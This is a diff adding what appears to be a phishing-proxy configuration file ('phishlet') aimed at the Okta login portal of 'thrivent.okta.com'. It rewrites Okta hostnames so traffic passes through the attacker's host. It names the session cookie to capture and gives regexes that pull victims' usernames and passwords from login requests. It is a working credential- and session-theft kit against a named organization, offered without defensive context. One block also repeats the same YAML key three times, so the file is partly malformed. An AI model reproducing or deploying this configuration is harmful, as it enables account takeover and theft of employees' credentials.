@@ -1,0 +1,43 @@
+# Minimum Version Required: 3.0.0
+name: 'Okta'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - phish_sub: 'okta'
+    phish_sub: 'cdn'
+    phish_sub: 'login'
+    orig_sub: 'thrivent'
+    domain: 'okta.com'
+    session: true
+    is_landing: true
+    auto_filter: true
+sub_filters:
+  - triggers_on: 'thrivent.okta.com'
+    orig_sub: 'thrivent'
+    domain: 'okta.com'
+    search: 'thrivent.okta.com'
+    replace: '{hostname}'
+    mimes: ['application/ion+json']
+  - triggers_on: 'thrivent.okta.com'
+    orig_sub: 'thrivent'
+    domain: 'okta.com'
+    search: 'https.*\.okta\.com'
+    replace: 'https://{hostname}'
+    mimes: ['text/html']
+auth_tokens:
+  - domain: 'thrivent.okta.com'
+    keys: ['idx']
+auth_urls:
+  - '/app/UserHome'
+credentials:
+  username:
+    key: ''
+    search: '"identifier":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"passcode":"([^"]*)'
+    type: 'json'
+login:
+  domain: 'thrivent.okta.com'
+  path: '/login/login.htm'
